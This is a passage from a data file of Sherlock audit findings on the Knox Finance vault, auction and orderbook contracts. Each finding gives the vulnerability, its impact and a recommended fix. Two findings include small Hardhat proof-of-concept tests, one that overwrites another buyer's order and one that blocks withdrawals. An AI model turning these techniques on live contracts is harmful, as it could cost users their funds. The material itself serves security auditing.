}\n        return friday8am;\n    }\n}\n```\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nAdd 8 hours to the check when doing subtraction of `friday8am - timestamp`.\n\n```diff\n    function _getNextFriday(uint256 timestamp) internal pure returns (uint256) {\n        // dayOfWeek = 0 (sunday) - 6 (saturday)\n        uint256 dayOfWeek = ((timestamp / 1 days) + 4) % 7;\n        uint256 nextFriday = timestamp + ((7 + 5 - dayOfWeek) % 7) * 1 days;\n        uint256 friday8am = nextFriday - (nextFriday % (24 hours)) + (8 hours);\n\n        // If the timestamp is on a Friday or between Monday-Thursday\n        // return Friday of the following week\n-       if (timestamp >= friday8am || friday8am - timestamp < 4 days) {\n+       if (timestamp >= friday8am || friday8am - timestamp < (4 days + 8 hours)) {\n            friday8am += 7 days;\n        }\n        return friday8am;\n    }\n}\n```",
      "summary": "\nThis bug report is about an issue found in the `_getNextFriday()` function of the VaultInternal.sol file. The issue is that when the timestamp is between Monday 12am and 8am, the function returns the same week Friday instead of the next Friday. This causes an issue in the `_setOptionParameters()` function, which relies on the `_getNextFriday()` function to set the expiry date. The expiry date will be wrong, causing malfunction of the protocol. The bug was found by yixxas through manual review. The recommendation to fix the issue is to add 8 hours to the check when doing the subtraction of `friday8am - timestamp`.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Knox Finance",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-09-knox-judging/issues/47",
      "tags": [],
      "finders": [
        "yixxas"
      ]
    },
    {
      "id": "3391",
      "title": "M-4: Users can avoid performance fees by withdrawing before the end of the epoch forcing other users to pay their fees",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-09-knox-judging/issues/75 \n\n## Found by \n0x52\n\n## Summary\n\nNo performance fees are taken when user withdraws early from the vault but their withdrawal value will be used to take fees, which will be taken from other users.\n\n## Vulnerability Detail\n\n    uint256 adjustedTotalAssets = _totalAssets() + l.totalWithdrawals;\n\n    if (adjustedTotalAssets > l.lastTotalAssets) {\n        netIncome = adjustedTotalAssets - l.lastTotalAssets;\n\n        feeInCollateral = l.performanceFee64x64.mulu(netIncome);\n\n        ERC20.safeTransfer(l.feeRecipient, feeInCollateral);\n    }\n\nWhen taking the performance fees, it factors in both the current assets of the vault as well as the total value of withdrawals that happened during the epoch. Fees are paid from the collateral tokens in the vault, at the end of the epoch. Paying the fees like this reduces the share price of all users, which effectively works as a fee applied to all users. The problem is that withdraws that take place during the epoch are not subject to this fee and the total value of all their withdrawals are added to the adjusted assets of the vault. This means that they don't pay any performance fee but the fee is still taken from the vault collateral. In effect they completely avoid the fee force all there other users of the vault to pay it for them.\n\n## Impact\n\nUser can avoid performance fees and force other users to pay them\n\n## Code Snippet\n\n[VaultInternal.sol#L504-L532](https://github.com/sherlock-audit/2022-09-knox/blob/main/knox-contracts/contracts/vault/VaultInternal.sol#L504-L532)\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nFees should be taken on withdrawals that occur before vault is settled",
      "summary": "\nThis bug report is about the vulnerability found in the VaultInternal.sol code, which allows users to avoid performance fees by withdrawing before the end of the epoch, forcing other users to pay their fees. This vulnerability was found by manual review and was located at VaultInternal.sol#L504-L532. \n\nThe code in question takes both the current assets of the vault and the total value of withdrawals that happened during the epoch into account when calculating the performance fees. This means that when a user withdraws during the epoch, their withdrawal value is added to the adjusted assets of the vault, and they don't pay any performance fee, but the fee is still taken from the vault collateral. \n\nThe impact of this vulnerability is that users can avoid performance fees and force other users to pay them. The recommendation to fix this issue is to take fees on withdrawals that occur before the vault is settled.",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Knox Finance",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-09-knox-judging/issues/75",
      "tags": [
        "Bypass limit",
        "Business Logic"
      ],
      "finders": [
        "0x52"
      ]
    },
    {
      "id": "3390",
      "title": "M-3: `epochsByBuyer[]` can lose records",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-09-knox-judging/issues/86 \n\n## Found by \nrvierdiiev, hansfriese, \\_\\_141345\\_\\_, bin2chen\n\n## Summary\n\nWhen `cancelLimitOrder()`, the `epoch` will be removed from `epochsByBuyer[]`, but the user could have other orders on the orderbook, the record will be inaccurate and mislead the users.\n\n\n## Vulnerability Detail\n\nIf a user put 2 limit orders with different prices, 2 separate id will be assigned, but only 1 epoch will be added to the `epochsByBuyer[]` array. \nIf the user cancel 1 of the orders, the `epoch` will be removed from `epochsByBuyer[]`, it will be impossible to track the other orders put by the user. And the `getEpochsByBuyer()` function will return inaccurate result.\n\n\n\n## Impact\n\nIf some users rely on the results of `getEpochsByBuyer()` for new orders, the returned inaccurate results could be misleading, and cause potential loss to the users due to wrong information.\n\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-09-knox/blob/main/knox-contracts/contracts/auction/AuctionInternal.sol#L545-L553\n\nhttps://github.com/sherlock-audit/2022-09-knox/blob/main/knox-contracts/contracts/auction/Auction.sol#L220\n\n\n\n## Tool used\n\nManual Review\n\n\n## Recommendation\n\nOnly remove the `epochsByBuyer` records when all the orders of the user is cancelled.",
      "summary": "\nThis bug report is about an issue found in the code of the Knox Auction smart contract. This issue occurs when a user places two limit orders with different prices, and the user cancels one of the orders. The issue is that only one epoch will be added to the `epochsByBuyer[]` array, and when the user cancels the order, the `epoch` will be removed from `epochsByBuyer[]`. This means that it is impossible to track the other orders put by the user, and the `getEpochsByBuyer()` function will return inaccurate results. This could lead to potential losses for users due to wrong information. The bug was found by rvierdiiev, hansfriese, \\_\\_141345\\_\\_, and bin2chen, and was confirmed with manual review. The recommendation is to only remove the `epochsByBuyer` records when all the orders of the user is cancelled.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Knox Finance",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-09-knox-judging/issues/86",
      "tags": [],
      "finders": [
        "rvierdiiev",
        "bin2chen",
        "hansfriese",
        "\\_\\_141345\\_\\_"
      ]
    },
    {
      "id": "3389",
      "title": "M-2: Chainlink's `latestRoundData` might return stale or incorrect results",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-09-knox-judging/issues/137 \n\n## Found by \nJeiwan, csanuragjain, berndartmueller, jayphbee, joestakey, Olivierdem, Ruhum, GalloDaSballo, \\_\\_141345\\_\\_, Trumpero, ArbitraryExecution, hansfriese, ali\\_shehab, cccz, 0xNazgul, ak1, ctf\\_sec, minhquanym\n\n## Summary\n\nChainlink's `latestRoundData()` is used but there is no check if the return value indicates stale data. This could lead to stale prices according to the Chainlink documentation:\n\n- https://docs.chain.link/docs/historical-price-data/#historical-rounds\n\n## Vulnerability Detail\n\nThe `PricerInternal._latestAnswer64x64` function uses Chainlink's `latestRoundData()` to get the latest price. However, there is no check if the return value indicates stale data.\n\n## Impact\n\nThe `PricerInternal` could return stale price data for the underlying asset.\n\n## Code Snippet\n\n[PricerInternal.\\_latestAnswer64x64](https://github.com/sherlock-audit/2022-09-knox/blob/main/knox-contracts/contracts/pricer/PricerInternal.sol#L50-L52)\n\n```solidity\n/**\n  * @notice gets the latest price of the underlying denominated in the base\n  * @return price of underlying asset as 64x64 fixed point number\n  */\nfunction _latestAnswer64x64() internal view returns (int128) {\n    (, int256 basePrice, , , ) = BaseSpotOracle.latestRoundData();\n    (, int256 underlyingPrice, , , ) =\n        UnderlyingSpotOracle.latestRoundData();\n\n    return ABDKMath64x64.divi(underlyingPrice, basePrice);\n}\n```\n\n## Tool Used\n\nManual review\n\n## Recommendation\n\nConsider adding checks for stale data. e.g\n\n```solidity\n(uint80 roundId, int256 basePrice, , uint256 updatedAt, uint80 answeredInRound) = BaseSpotOracle.latestRoundData();\n\nrequire(answeredInRound >= roundId, \"Price stale\");\nrequire(block.timestamp - updatedAt < PRICE_ORACLE_STALE_THRESHOLD, \"Price round incomplete\");\n```",
      "summary": "\nThis bug report is about Chainlink's `latestRoundData()` function which could return stale or incorrect results. It was found by Jeiwan, csanuragjain, berndartmueller, jayphbee, joestakey, Olivierdem, Ruhum, GalloDaSballo, \\_\\_141345\\_\\_, Trumpero, ArbitraryExecution, hansfriese, ali\\_shehab, cccz, 0xNazgul, ak1, ctf\\_sec, minhquanym and reported on Github. The function `PricerInternal._latestAnswer64x64` uses Chainlink's `latestRoundData()` to get the latest price but there is no check if the return value indicates stale data. This could lead to stale prices according to the Chainlink documentation. The impact of this bug is that the `PricerInternal` could return stale price data for the underlying asset. Manual review was used to detect the bug and the recommendation is to consider adding checks for stale data.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Knox Finance",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-09-knox-judging/issues/137",
      "tags": [
        "Stale Price",
        "Chainlink"
      ],
      "finders": [
        "csanuragjain",
        "0xNazgul",
        "jayphbee",
        "cccz",
        "ali\\_shehab",
        "Jeiwan",
        "minhquanym",
        "joestakey",
        "GalloDaSballo",
        "Ruhum",
        "ArbitraryExecution",
        "berndartmueller",
        "Trumpero",
        "hansfriese",
        "\\_\\_141345\\_\\_",
        "ak1",
        "Olivierdem",
        "ctf\\_sec"
      ]
    },
    {
      "id": "3388",
      "title": "M-1: ## Auction can be ended with large limit order",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-09-knox-judging/issues/153 \n\n## Found by \nArbitraryExecution\n\nIn the function AuctionInternal._previewWithdraw, the number type(int128).max is used as a sentinel value for deciding whether the auction is canceled. However, an order for all contracts at a price of type(int128).max passes all requires checks for limit orders.\n\nIf such an order is placed at the start of the auction, the auction can be finalized and the trader will be refunded the entire amount when the auction is processed or canceled. This effectively prevents the auction from taking place.\n\n#### Recommendation\n\nUse AuctionStorage.Status instead of sentinel values for determining whether the auction is in the canceled state.",
      "summary": "\nThis bug report concerns the function AuctionInternal._previewWithdraw in the Auction contract. It was found by ArbitraryExecution and it states that if an order is placed at the start of the auction with a price of type(int128).max, the auction can be finalized and the trader will be refunded the entire amount when the auction is processed or canceled. This prevents the auction from taking place. The recommendation is to use AuctionStorage.Status instead of sentinel values for determining whether the auction is in the canceled state.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Knox Finance",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-09-knox-judging/issues/153",
      "tags": [],
      "finders": [
        "ArbitraryExecution"
      ]
    },
    {
      "id": "3387",
      "title": "H-4: Wrong implementation of orderbook can make user can't get their fund back",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2022-09-knox-judging/issues/66 \n\n## Found by \nTrumpero\n\n## Lines of code \nhttps://github.com/sherlock-audit/2022-09-knox/blob/main/knox-contracts/contracts/auction/OrderBook.sol#L240\nhttps://github.com/sherlock-audit/2022-09-knox/blob/main/knox-contracts/contracts/auction/OrderBook.sol#L182-L190\n\n## Summary\nWhen a user remove an order, next user call `addLimitOrder` can override the latest order with his/her order. It will make one who is owner of that latest order lose their fund. \n\n## Vulnerability Detail\nFunction `_remove` will decrease value of `index.length` by 1 when an order is removed\n```solidity=\n// url = https://github.com/sherlock-audit/2022-09-knox/blob/main/knox-contracts/contracts/auction/OrderBook.sol#L240\nfunction _remove(Index storage index, uint256 id) internal returns (bool) {\n    index.length = index.length > 0 ? index.length - 1 : 1;\n    ...\n}\n```\nInstead of reserving `id` of removed order to reuse for next created order, function `_insert` use the id of new order is `index.length + 1`\n```solidity=\n// url = https://github.com/sherlock-audit/2022-09-knox/blob/main/knox-contracts/contracts/auction/OrderBook.sol#L165-L172\nfunction _insert(\n    Index storage index,\n    int128 price64x64,\n    uint256 size,\n    address buyer\n) internal returns (uint256) {\n    index.length = index.length > 0 ? index.length + 1 : 1;\n    uint256 id = index.length;\n    ...\n}\n```\nIt will override the latest order with new order's data.\n\nFor example\n* Alice create an order with price = 10 --> `id = 1, index.length = 1`\n* Bob create an order with price = 20 --> `id = 2, index.length = 2` \n* Alice cancel order `id = 1` --> `index.length = 1`\n* Candice create new order with price = 30 \n    * At this time, new order will have `id = index.length + 1 = 1 + 1 = 2`. It will override the state of Bob's order: price from 20 -> 30 \n\n## Impact\nUser whose order is overrided can't withdraw their refund `ERC20` and their exercised tokens. \n\n## Code Snippet\n```typescript=\nit.only(\"bug\", async() => {\n    const totalContracts = await auction.getTotalContracts(epoch);\n\n    const buyer1OrderSize = totalContracts.div(5);\n    const buyer2OrderSize = totalContracts.div(5);\n    const buyer3OrderSize = totalContracts.div(5);\n\n    // buyer1 create order with price = 10\n    await asset\n      .connect(signers.buyer1)\n      .approve(addresses.auction, ethers.constants.MaxUint256);\n    await auction.addLimitOrder(epoch, 10, buyer1OrderSize);\n\n    // buyer2 create order with price = 20\n    await asset \n      .connect(signers.buyer2)\n      .approve(addresses.auction, ethers.constants.MaxUint256);\n    await auction\n      .connect(signers.buyer2)\n      .addLimitOrder(epoch, 20, buyer2OrderSize);\n\n    // order with id = 2 have price = 20 \n    expect( (await auction.getOrderById(epoch, 2)).price64x64 ).to.equal(20);\n\n    // buyer1 cancel order with id = 1\n    await auction.connect(signers.buyer1).cancelLimitOrder(epoch, 1);\n\n    // buyer3 create order with price = 30\n    await asset\n      .connect(signers.buyer3)\n      .approve(addresses.auction, ethers.constants.MaxUint256);\n    await auction\n      .connect(signers.buyer3)\n      .addLimitOrder(epoch, 30, buyer3OrderSize);\n\n    // order with id = 2 have price = 30 --> nervous \n    expect( (await auction.getOrderById(epoch, 2)).price64x64 ).to.equal(30);\n});\n```\nTo check with test, u can use this file \nhttps://gist.github.com/Trumpero/adbcd84c33f71856dbf379f581e8abbb\nI write one more describe `::Bug` beside your original describe `::Auction` in file `Auction.behavior.ts` (just too lazy to write a new one). \n\n## Tool used\nHardhat \n\n## Recommendation\nUse an array to store unused (removed) id, then assign each id to the new limit order created instead of using `index.length`.",
      "summary": "\nThis bug report is about an issue found in the OrderBook.sol file of the sherlock-audit/2022-09-knox-judging repository on GitHub. The issue was found by Trumpero and is labeled as Issue H-4. It states that when a user removes an order, the next user to call the addLimitOrder function can override the latest order with their own order, which can cause the owner of the latest order to lose their funds. \n\nThe code snippet provided in the report explains how the vulnerability works. It starts with Alice creating an order with a price of 10, Bob creating an order with a price of 20, and Alice canceling her order. Then, Candice creates a new order with a price of 30. The new order will have an id of 2, which is the same as Bob's order. This will override Bob's order, causing him to lose his funds.\n\nThe report also includes a tool used to test the vulnerability, which is Hardhat. The recommendation given is to use an array to store unused (removed) id, and assign each id to the new limit order created instead of using index.length. This will ensure that no orders are overridden and users will not lose their funds.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Knox Finance",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-09-knox-judging/issues/66",
      "tags": [
        "Array",
        "Business Logic",
        "Array Reorder"
      ],
      "finders": [
        "Trumpero"
      ]
    },
    {
      "id": "3386",
      "title": "H-3: Auction can potentially sell more contracts than it has collateral for.",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2022-09-knox-judging/issues/80 \n\n## Found by \nhansfriese, yixxas\n\n## Summary\n`auction.totalContracts` is determined by the amount of collateral the protocol has received. After an auction has ended, users are allowed to withdraw and what they receive depends on whether their orders have filled, or they receive a refund, or a mixture of both. However, wrong accounting in `_previewWithdraw()` can lead to the `fill` and `refund` value to be calculated wrongly.\n\n## Vulnerability Detail\nEach time a withdrawal is made, the order is removed from the order book as seen in L339 in `_previewWithdraw()`. Now, the issue here is in the line `totalContractsSold += data.size`. If a user with an order that is higher priced, that is with a lower index in the order book( since order book is in decreasing order based on price ), chooses to withdraw first, their order is removed from the order book. Now, the next user who does a withdraw will call this same function, but `totalContractsSold` is calculated from 0 again. This leads to problems and I illustrate with a simple example below.\n\n\nAssume,\n`auction.totalContracts = 10`\n\nAlice first `addLimitOrder()` with `price = 10`, `size = 10`.\nBob then `addLimitOrder()` with `price = 10`, 'size = 1'.\n\nNow order book have 2 orders.\n\n`processOrder()` is then called, since utilisation reaches a 100%, clearing price is set to 10 and all contracts are sold to Alice.\nNow, Alice does a withdraw first and withdraws successfully with `fill = 10, refund = 0`. Now Bob tries to withdraw, the previous order is removed from the order book, so when `i = 1`, it enters the `if (data.price64x64 >= lastPrice64x64)` check. This time, `if (totalContractsSold + data.size >= auction.totalContracts)` check does not pass since `totalContractsSold = 0, data.size = 1, auction.totalContracts = 10`. It will then enter the else part where `fill += data.size`. This means that additional contracts are being sold to Bob even though it has been previously sold to Alice which exceeds the limit that the collateral allows.\n\n## Impact\nAuction is selling more contracts than it has collateral for which creates plenty of liquidity problems / issues with risk as options are now \"naked\".\n\n## Code Snippet\n\n[AuctionInternal.sol#L279-L347](https://github.com/sherlock-audit/2022-09-knox/blob/main/knox-contracts/contracts/auction/AuctionInternal.sol#L279-L347)\n```solidity\n    function _previewWithdraw(\n        AuctionStorage.Layout storage l,\n        bool isPreview,\n        uint64 epoch,\n        address buyer\n    ) private returns (uint256, uint256) {\n        ...\n        uint256 totalContractsSold;\n        ...\n        // traverse the order book and return orders placed by the buyer\n        for (uint256 i = 1; i <= length; i++) {\n            OrderBook.Data memory data = orderbook._getOrderById(next);\n            next = orderbook._getNextOrder(next);\n\n            if (data.buyer == buyer) {\n                if (\n                    lastPrice64x64 < type(int128).max &&\n                    data.price64x64 >= lastPrice64x64\n                ) {\n                    // if the auction has not been cancelled, and the order price is greater than or\n                    // equal to the last price, fill the order and calculate the refund amount\n                    uint256 paid = data.price64x64.mulu(data.size);\n                    uint256 cost = lastPrice64x64.mulu(data.size);\n\n                    if (\n                        totalContractsSold + data.size >= auction.totalContracts\n                    ) {\n                        // if part of the current order exceeds the total contracts available, partially\n                        // fill the order, and refund the remainder\n                        uint256 remainder =\n                            auction.totalContracts - totalContractsSold;\n\n                        cost = lastPrice64x64.mulu(remainder);\n                        fill += remainder;\n                    } else {\n                        // otherwise, fill the entire order\n                        fill += data.size;\n                    }\n\n                    // the refund takes the difference between the amount paid and the \"true\" cost of\n                    // of the order. the \"true\" cost can be calculated when the clearing price has been\n                    // set.\n                    refund += paid - cost;\n                } else {\n                    // if last price >= type(int128).max, auction has been cancelled, only send refund\n                    // if price < last price, the bid is too low, only send refund\n                    refund += data.price64x64.mulu(data.size);\n                }\n\n                if (!isPreview) {\n                    // when a withdrawal is made, remove the order from the order book\n                    orderbook._remove(data.id);\n                }\n            }\n\n            totalContractsSold += data.size;\n        }\n\n        return (refund, fill);\n    }\n```\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nThis problem arises due to how orders that have the same price as the clearing price, yet should not be filled due to exceeding the limit is not accounted for. A check in `_previewWithdraw()` needs to be done to prevent this edge case.\n\nI believe removing an order from the order book after withdrawal is done to prevent multiple withdrawals from the same user. If this is the case, we can use a mapping to check this instead, so that `totalContractsSold` remains accurate. We can then refund users once this exceeds `auction.totalContracts`.",
      "summary": "\nThis bug report is about an issue in the Auction contract of the Sherlock Audit project. The issue is that the contract can potentially sell more contracts than it has collateral for. This is because when a withdrawal is made, the order is removed from the order book which can lead to wrong accounting in `_previewWithdraw()` and `fill` and `refund` value to be calculated wrongly. \n\nThis is illustrated by an example of Alice and Bob, where Alice first adds a limit order with a price of 10 and size of 10, and Bob then adds a limit order with a price of 10 and size of 1. After `processOrder()` is called, clearing price is set to 10 and all contracts are sold to Alice. Now, when Alice does a withdraw first and withdraws successfully with `fill = 10, refund = 0`, Bob tries to withdraw. Since Alice's order is removed from the order book, `totalContractsSold` is calculated from 0 again. This leads to Bob receiving additional contracts even though it has been previously sold to Alice which exceeds the limit that the collateral allows. \n\nThe impact of this is that Auction is selling more contracts than it has collateral for which creates plenty of liquidity problems / issues with risk as options are now \"naked\". The code snippet and recommendation provided is to add a check in `_previewWithdraw()` to prevent this edge case, and to use a mapping to check multiple withdrawals from the same user. The tool used for finding this issue is Manual Review.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Knox Finance",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-09-knox-judging/issues/80",
      "tags": [],
      "finders": [
        "hansfriese",
        "yixxas"
      ]
    },
    {
      "id": "3385",
      "title": "H-2: [NAZ-M6] Unbounded loop in `_previewWithdraw() && _redeemMax()` Can Lead To DoS",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2022-09-knox-judging/issues/102 \n\n## Found by \n\\_\\_141345\\_\\_, 0xNazgul, ctf\\_sec\n\n## Summary\nThere are some unbounded loops that can lead to DoS.\n\n## Vulnerability Detail\nThe loop inside of `_previewWithdraw()` goes through all orders in `orderbook` and checks if the `data.buyer` is the `buyer` passed in parameter. It does some checks, math and an external call to remove the `data.id` from the orderbook. With all of this happening in the loop and costing gas it may revert due to exceeding the block size gas limit. This is the same case for `_redeemMax()` but has more gas costly executions with `transfer()` being involved.\n\n## Impact\nThere are over thousands of orders that the loop has to go through, along with the massive amount of orders that are the `buyer`s. Half way through the execution fails due to exceeding the block size gas limit.\n\n## Code Snippet\n[`AuctionInternal.sol#L298`](https://github.com/sherlock-audit/2022-09-knox/blob/main/knox-contracts/contracts/auction/AuctionInternal.sol#L298), [`QueueInternal.sol#L140`](https://github.com/sherlock-audit/2022-09-knox/blob/main/knox-contracts/contracts/queue/QueueInternal.sol#L140)\n\n## Tool used\nManual Review\n\n## Recommendation\nConsider avoiding all the actions executed in a single transaction, especially when calls are executed as part of a loop.\n\n## Discussion\n\n**0xCourtney**\n\nIt might make sense to treat `redeemMax` as a separate issue since it's in a different contract and therefore relies on a different mechanism than the other functions mentioned. `redeemMax` implements a for-loop that iterates through all of the tokenId's held by an account. These tokenId's accumulate whenever a user deposits collateral into the queue during different epochs. The `redeemMax` function is called every time a user deposits, into the Queue or withdraws from the Vault. This makes it impossible to accumulate more than one new tokenId at a time.\n\nThis applies specifically to issues #15, and #102.\n\n**Evert0x**\n\n@0xCourtney would you consider 15 / 102 a different severity than the others? Based on your comment I assume this issue related to `redeemMax` is invalid but the others (24, 25, 82, 85) are valid. Is that correct?\n\n**0xCourtney**\n\n#25 is actually incorrect. We do check that size > minSize for the auction orders for [`_validateLimitOrder`](https://github.com/sherlock-audit/2022-09-knox/blob/main/knox-contracts/contracts/auction/AuctionInternal.sol#L485) and [`_validateMarketOrder`](https://github.com/sherlock-audit/2022-09-knox/blob/main/knox-contracts/contracts/auction/AuctionInternal.sol#L506)\n#102 should be two separate issues, one for `previewWithdraw` another for `redeemMax`. The issue mentioned about `redeemMax` should be low or informational for the reasons stated above.\n#15 likewise should be low or informational as its related to `redeemMax`\n#24, #82, and #85 are issues we plan to fix.\n\n**Evert0x**\n\nFor #25 `minSize` is set in the `AuctionProxy` constructor but no `> 0` check is done, but we consider that a low issue.\n\n**Evert0x**\n\nJust for confirmation I kept #102 the main issue, although it's referencing two separate issues. #24, #82 and #85 are duplicates of this. Rest of the issues are low/invalid",
      "summary": "\nThis bug report is about an unbounded loop in the functions `_previewWithdraw()` and `_redeemMax()` in the Knox contract that could lead to a denial of service (DoS). The loops go through all orders in the orderbook and do some checks, math, and an external call. This can cause the transaction to exceed the block size gas limit and fail. There are thousands of orders that the loop has to go through, and the problem could happen halfway through the execution. The code snippets for the functions are located in `AuctionInternal.sol#L298` and `QueueInternal.sol#L140`.\n\nThe bug was found by \\_\\_141345\\_\\_, 0xNazgul, and ctf\\_sec during a manual review. The recommendation is to avoid all the actions executed in a single transaction, especially when calls are executed as part of a loop.\n\nThe discussion about the bug focused on the issue #102 and the related issues #15 and #25. Issue #15 and #25 were considered low or informational, while issue #102 is the main issue and the other issues (#24, #82, and #85) are duplicates. For issue #25, a `minSize` is set in the `AuctionProxy` constructor but no `> 0` check is done.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Knox Finance",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-09-knox-judging/issues/102",
      "tags": [],
      "finders": [
        "0xNazgul",
        "\\_\\_141345\\_\\_",
        "ctf\\_sec"
      ]
    },
    {
      "id": "3384",
      "title": "H-1: Underflow in ```_previewWithdraw``` could prevent withdrawals",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2022-09-knox-judging/issues/106 \n\n## Found by \ndipp, \\_\\_141345\\_\\_, Trumpero, 0x52, hansfriese, yixxas\n\n## Summary\n\nAn underflow in the ```_previewWithdraw``` function in ```AuctionInternal.sol``` due to totalContractsSold exceeding auction.totalContracts could prevent users from withdrawing options.\n\n## Vulnerability Detail\n\nThe ```_previewWithdraw``` function returns the fill and refund amounts for a buyer by looping over all orders. A totalContractsSold variable is used to track the amount of contracts sold as the loop iterates over all orders. If the current order's size + totalContractsSold exceeds the auction's totalContracts then the order will only be filled partially. The calculation for the partial fill (remainder) is given on [line 318](https://github.com/sherlock-audit/2022-09-knox/blob/main/knox-contracts/contracts/auction/AuctionInternal.sol#L318). This will lead to an underflow if totalContractsSold > the auction's totalContracts which would happen if there are multiple orders that cause the totalContractsSold variable to exceed totalContracts.\n\nThe totalContractsSold variable in ```_previewWithdraw``` could exceed the auction.totalContracts due to the contracts sold before the start of an auction through limit orders not being limited. When an order is added, _finalizeAuction is only called if the auction has started. The ```_finalizeAuction``` function will call the ```_processOrders``` function which will return true if the auction has reached 100% utilization. Since limit orders can be made before the start of an auction, _finalizeAuction is not called and any amount of new orders may be made.\n\nExample: The buyer makes a limit order with size > auction.totalContracts. They then make another order with size of anything. These orders are made before the start of the auction so ```_processOrders``` is not called for every new order and totalContractsSold can exceed totalContracts. When ```_previewWithdraw``` is called, after the buyer's first order is processed, totalContractsSold > auction.totalContracts so the condition on [line 313](https://github.com/sherlock-audit/2022-09-knox/blob/main/knox-contracts/contracts/auction/AuctionInternal.sol#L313) passes. Since totalContractsSold > auction.totalContracts the calculation on [line 318](https://github.com/sherlock-audit/2022-09-knox/blob/main/knox-contracts/contracts/auction/AuctionInternal.sol#L318) underflows and the transaction reverts. The ```_previewWithdraw``` function and thus the ```_withdraw``` function is uncallable.\n\nTest code added to ```Auction.behaviour.ts```, under the ```#addLimitOrder(uint64,int128,uint256)``` section:\n\n```typescript\n\tit(\"previewWithdraw reverts if buyer has too many contracts\", async () => {\n          assert.isEmpty(await auction.getEpochsByBuyer(addresses.buyer1));\n\n          await asset\n            .connect(signers.buyer1)\n            .approve(addresses.auction, ethers.constants.MaxUint256);\n\n          const totalContracts = await auction.getTotalContracts(epoch);\n          await auction.addLimitOrder(\n            epoch,\n            fixedFromFloat(params.price.max),\n            totalContracts.mul(2)\n          );\n\n          await auction.addLimitOrder(\n            epoch,\n            fixedFromFloat(params.price.max),\n            totalContracts.div(2)\n          );\n\n          const epochByBuyer = await auction.getEpochsByBuyer(addresses.buyer1);\n\n          assert.equal(epochByBuyer.length, 1);\n          assert.bnEqual(epochByBuyer[0], epoch);\n          \n          await expect(auction.callStatic[\n            \"previewWithdraw(uint64)\"\n          ](epoch)).to.be.reverted;\n        });\n```\n\nThe test code above shows a buyer is able to add an order with size auction.totalContracts*2 and a subsequent order with size auction.totalContracts/2. The ```previewWithdraw``` function reverts when called. \n\n## Impact\n\nUsers would be unable to withdraw from the Auction contract.\n\n## Code Snippet\n\n[AuctionInternal.sol:_previewWithdraw#L312-L321](https://github.com/sherlock-audit/2022-09-knox/blob/main/knox-contracts/contracts/auction/AuctionInternal.sol#L312-L321)\n```solidity\n                    if (\n                        totalContractsSold + data.size >= auction.totalContracts\n                    ) {\n                        // if part of the current order exceeds the total contracts available, partially\n                        // fill the order, and refund the remainder\n                        uint256 remainder =\n                            auction.totalContracts - totalContractsSold;\n\n                        cost = lastPrice64x64.mulu(remainder);\n                        fill += remainder;\n```\n[AuctionInternal.sol:_validateLimitOrder#L479-L489](https://github.com/sherlock-audit/2022-09-knox/blob/main/knox-contracts/contracts/auction/AuctionInternal.sol#L479-L489)\n```solidity\n    function _validateLimitOrder(\n        AuctionStorage.Layout storage l,\n        int128 price64x64,\n        uint256 size\n    ) internal view returns (uint256) {\n        require(price64x64 > 0, \"price <= 0\");\n        require(size >= l.minSize, \"size < minimum\");\n\n        uint256 cost = price64x64.mulu(size);\n        return cost;\n    }\n```\n\n[AuctionInternal.sol:_addOrder#L545-L562](https://github.com/sherlock-audit/2022-09-knox/blob/main/knox-contracts/contracts/auction/AuctionInternal.sol#L545-L562)\n```solidity\n    function _addOrder(\n        AuctionStorage.Layout storage l,\n        AuctionStorage.Auction storage auction,\n        uint64 epoch,\n        int128 price64x64,\n        uint256 size,\n        bool isLimitOrder\n    ) internal {\n        l.epochsByBuyer[msg.sender].add(epoch);\n\n        uint256 id = l.orderbooks[epoch]._insert(price64x64, size, msg.sender);\n\n        if (block.timestamp >= auction.startTime) {\n            _finalizeAuction(l, auction, epoch);\n        }\n\n        emit OrderAdded(epoch, id, msg.sender, price64x64, size, isLimitOrder);\n    }\n```\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nThe loop in ```_previewWithdraw``` should check if the current totalContractsSold is >= totalContracts. If it is then the remainder should be set to 0 which would allow the current order to be fully refunded.\n\nAdditionally, the orders for an auction should be checked before the auction starts. In ```_addOrder```, consider adding a condition that will call ```_processOrders``` if the auction has not started yet. If ```_processOrders``` returns true then do not allow the order to be added. Or just allow the auction to be finalized before it starts if the total contracts sold has reached the auction's totalContracts.",
